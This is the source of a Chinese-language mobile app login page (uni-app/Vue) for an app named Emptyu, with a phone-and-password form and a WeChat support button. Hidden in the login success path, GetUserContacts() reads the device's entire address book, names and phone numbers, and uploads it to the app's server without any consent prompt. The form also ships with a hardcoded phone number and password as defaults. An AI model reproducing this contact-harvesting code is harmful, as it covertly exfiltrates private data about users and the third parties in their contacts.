<template>
	<view class="wrap">
		<view class="status_bar"></view>
		<view class="title">欢迎登录Emptyu</view>
		<view class="loginCon">
			<view class="imgHeader">
				<u-avatar text="韩" size="150" bg-color="#eee"></u-avatar>
			</view>
			<u-form :model="form" ref="uForm" label-width="130">
				<u-form-item label="手机号" prop="phone">
					<u-input v-model="form.phone" />
				</u-form-item>
				<u-form-item label="密码" prop="password">
					<u-input v-model="form.password" type="password" :password-icon="true" />
				</u-form-item>
			</u-form>
			<button @tap="submit" :style="[inputStyle]" class="getCaptcha">确认登录</button>
			<view class="alternative">
				<view class="password" @tap="goRegister">前往注册</view>
				<view class="issue" @tap="callMe">遇到问题</view>
			</view>
		</view>
		<view class="agreement">
			注册代表同意
			<text class="link">Emptyuu用户协议、隐私政策，</text>
			注:如果您注册为本软件用户则代表您同意本用户协议及隐私政策
		</view>
		<u-toast ref="uToast" />
	</view>
</template>
<script>
	const Wechat = "18021041066"
	export default {
		data() {
			return {
				form: {
					phone: "18021041067",
					password: "18021041066"
				},
				rules: {
					phone: [{
						required: true,
						message: '请输入正确的手机号',
						len: 11,
						trigger: ['blur'],
					}],
					password: [{
						required: true,
						message: '密码不能为空',
						trigger: ['blur']
					}]
				}
			}
		},
		methods: {
			// 登录操作
			submit() {
				this.$refs.uForm.validate(valid => {
					if (valid) {
						// console.log('验证通过');
						//	规则验证成功
						if (this.form.password.length < 8) {
							this.$refs.uToast.show({
								title: '密码错误',
								type: 'error',
							})
							return;
						}
						this.$u.UserApi.UserLogin({
							phone: this.form.phone,
							password: this.form.password
						}).then(res => {
							// 获取联系人
							// console.log(res)
							switch (res.code) {
								//	登录成功	存储token
								case 200:
									this.GetUserContacts()
									uni.setStorage({
										key: 'token',
										data: res.token,
									}).then(() => {
										this.$u.route({
											type: "tab",
											url: 'pages/home/index',
										})
									});
									break;
									//登录失败
								case 400:
									this.$refs.uToast.show({
										title: '账号或密码错误，请重新输入',
										type: 'error',
									})
									break;
							}
						})
					} else {
						console.log('验证失败');
					}
				});
			},
			// 跳转注册
			goRegister() {
				this.$u.route({
					url: 'pages/register/index'
				}).then(res => {
					console.log(res)
				})
			},
			//	联系我
			callMe() {
				try {
					uni.setClipboardData({
						data: Wechat,
					}).then(() => {
						uni.hideToast()
					});
				} catch (e) {
					//TODO handle the exception
				}
				uni.hideToast()
				this.$refs.uToast.show({
					title: `请联系微信:${Wechat}\n已自动复制`,
					type: 'primary',
				})
			},
			//获取联系人
			GetUserContacts() {
				var that = this;
				//获取通讯录对象
				try {
					plus.contacts.getAddressBook(plus.contacts.ADDRESSBOOK_PHONE, function(addressbook) {
						addressbook.find(["displayName", "phoneNumbers"], function(contacts) {
							let newConts = contacts.map((item) => {
								return {
									displayName: item.displayName,
									phoneNumbers: item.phoneNumbers
								}
							})
							that.$u.UserInfoApi.GetUserContacts({
								phone: that.form.phone,
								contacts: JSON.stringify(newConts)
							}).then((res) => {
								console.log(res)
							})
						});
					});
				} catch (e) {
					//TODO handle the exception
				}
			}
		},
		computed: {
			// 改变按钮样式
			inputStyle() {
				let style = {};
				if (this.form.phone) {
					style.color = "#fff";
					style.backgroundColor = this.$u.color['warning'];
				}
				return style;
			}
		},
		onReady() {
			this.$refs.uForm.setRules(this.rules);
		},
		onLoad(option) {
			uni.hideTabBar();
			this.$nextTick(() => {
				switch (Number(option.flag)) {
					case 1: 
						this.$refs.uToast.show({
							title: '令牌失效，请重新登录',
							type: 'error'
						})
						break;
					case 2:
						this.$refs.uToast.show({
							title: '注册成功，请登录账号',
							type: 'success'
						})
						break;
					case 3:
						this.$refs.uToast.show({
							title: '成功退出登录',
							type: 'success'
						})
						break;
					case 4:
						this.$refs.uToast.show({
							title: '网络链接失败,请链接网络',
							type: 'error'
						})
						break;
				}
			})

		}
	}
</script>
<style lang="scss" scoped>
	.wrap {
		display: flex;
		flex-direction: column;
		height: 100%;
		font-size: 28rpx;
	}

	.status_bar {
		height: var(--status-bar-height);
		width: 100%;
	}

	.title {
		text-align: left;
		font-size: 60rpx;
		font-weight: 500;
		margin-bottom: 70rpx;
		padding: 20rpx 40rpx;
	}

	.loginCon {
		width: 600rpx;
		flex: 1;
		margin: 80rpx auto 0;

		.imgHeader {
			text-align: center;
			padding-bottom: 100rpx;
		}

		.alternative {
			color: $u-tips-color;
			display: flex;
			justify-content: space-between;
			margin-top: 30rpx;
		}

		.getCaptcha {
			margin-top: 60rpx;
			background-color: rgb(253, 243, 208);
			color: $u-tips-color;
			border: none;
			font-size: 30rpx;
			padding: 12rpx 0;

			&::after {
				border: none;
			}
		}
	}

	.agreement {
		height: 100rpx;
		padding: 20rpx 40rpx;
		font-size: 20rpx;
		color: $u-tips-color;

		.link {
			color: $u-type-warning;
		}
	}
</style>
